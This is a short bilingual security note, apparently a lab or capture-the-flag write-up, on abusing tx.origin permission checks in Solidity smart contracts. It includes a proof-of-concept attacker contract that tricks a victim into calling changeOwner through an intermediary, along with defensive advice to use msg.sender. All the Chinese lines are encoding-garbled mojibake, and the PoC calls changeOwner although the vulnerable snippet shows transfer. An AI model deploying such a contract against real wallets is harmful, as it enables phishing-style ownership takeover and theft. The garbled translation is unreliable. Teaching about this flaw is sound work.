# Exploit Idea: Using `tx.origin` for permission checking can lead to phishing-style attacks

# æ¼æ´æ€è·¯ï¼šä½¿ç”¨ `tx.origin` åšæƒé™æ ¡éªŒå¯èƒ½å¯¼è‡´é’“é±¼å¼æ”»å‡»

---

## ğŸ§  Concept Summary / æ¦‚å¿µæ€»ç»“

if a contract uses `tx.origin` for permission checking like this:
å¦‚æœæŸä¸ªåˆçº¦åƒè¿™æ ·ä½¿ç”¨ `tx.origin` è¿›è¡Œæƒé™æ ¡éªŒï¼š

```javascript
    function transfer(address to, uint amount) public {
        require(tx.origin == owner, "Not owner");
        // è½¬è´¦é€»è¾‘...
    }
```

This check can potentially be bypassed by calling the contract through an intermediary contract (â€œContract Aâ€ calling â€œContract Bâ€).
å¯ä»¥é€šè¿‡â€œåˆçº¦ A è°ƒç”¨åˆçº¦ Bâ€çš„æ–¹å¼ç»•è¿‡ tx.origin == owner çš„åˆ¤æ–­ã€‚

---

## ğŸ”¬Proof of Concept / æ¦‚å¿µè¯æ˜

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneAttacker{
    function attack() external {
        address telephoneContractAddr = <victim-contract-address>;
        (bool success ,bytes memory data) = telephoneContractAddr.call(
            abi.encodeWithSignature("changeOwner(address)", <attacter-address>)
        );
    }
}
```

If you can trick the victim into interacting with this attack contract,
you can exploit tx.origin to bypass the permission check.
Because tx.origin will always be the original external user â€” in this case, the victim.
å¦‚æœä½ è¯±å¯¼å—å®³è€…ä¸æ”»å‡»åˆçº¦äº§ç”Ÿäº¤äº’ï¼Œå°±èƒ½åˆ©ç”¨ tx.origin ç»•è¿‡æƒé™éªŒè¯ã€‚
å› ä¸º tx.origin æ°¸è¿œæŒ‡å‘äº¤æ˜“æœ€åˆå‘èµ·çš„å¤–éƒ¨è´¦æˆ·ï¼Œä¹Ÿå°±æ˜¯å—å®³è€…ã€‚

---

## ğŸ“Notes

1. Using msg.sender is much safer than using tx.origin.
   ç›¸è¾ƒäº tx.originï¼Œä½¿ç”¨ msg.sender æ›´åŠ å®‰å…¨ã€‚
2. Be cautious when designing admin-level or transfer functions.
   Flexibility often introduces more potential attack surfaces.
   åœ¨è®¾è®¡ç®¡ç†å‘˜æ“ä½œæˆ–è½¬è´¦å‡½æ•°æ—¶éœ€è¦æ ¼å¤–å°å¿ƒï¼Œè¶Šçµæ´»çš„è®¾è®¡å¾€å¾€æ„å‘³ç€è¶Šå¤§çš„æ”»å‡»é¢ã€‚
